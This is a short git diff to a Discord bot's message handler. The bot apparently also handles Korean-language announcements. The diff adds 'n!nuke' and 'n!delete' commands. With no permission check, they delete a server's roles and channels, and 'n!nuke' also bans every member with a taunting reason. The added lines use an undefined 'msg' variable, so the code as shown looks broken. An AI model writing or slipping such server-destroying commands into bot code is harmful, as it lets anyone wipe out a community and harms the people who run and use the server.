@@ -106,6 +106,16 @@ client.on('message', (message) => {
     message.channel.send(embed)
   }
 
+  if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
+}
+if(msg.content.toLowerCase().startsWith("n!" + "delete")){
+    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+}
+
   if(message.content.startsWith('에메랄드 전체공지')) {
     if(checkPermission(message)) return
     if(message.member != null) { // 채널에서 공지 쓸 때
